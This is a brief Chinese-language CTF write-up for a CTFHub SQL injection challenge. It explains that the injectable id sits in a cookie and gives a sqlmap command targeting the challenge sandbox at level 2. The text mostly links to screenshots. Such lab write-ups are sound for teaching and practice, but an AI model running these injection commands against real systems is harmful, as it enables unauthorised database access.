# CTFHUB_过滤空格

## 题目内容

![image-20210824185613162](/home/adian/note/Study_Note/网络安全/CTF/pic/18.png)

## WriteUp

cookie字段中有一个id,我们可以通过cookie editor更改内容

![image-20210824185714799](/home/adian/note/Study_Note/网络安全/CTF/pic/19.png)

剩下的过程就是整数型注入的内容了

![image-20210824185915938](/home/adian/note/Study_Note/网络安全/CTF/pic/20.png)

此题可以使用sqlmap

```
sudo sqlmap -u http://challenge-b766ef61d67cb5ca.sandbox.ctfhub.com:10800/ --cookie='id=1' --level 2
```

cookies注入需要level 2
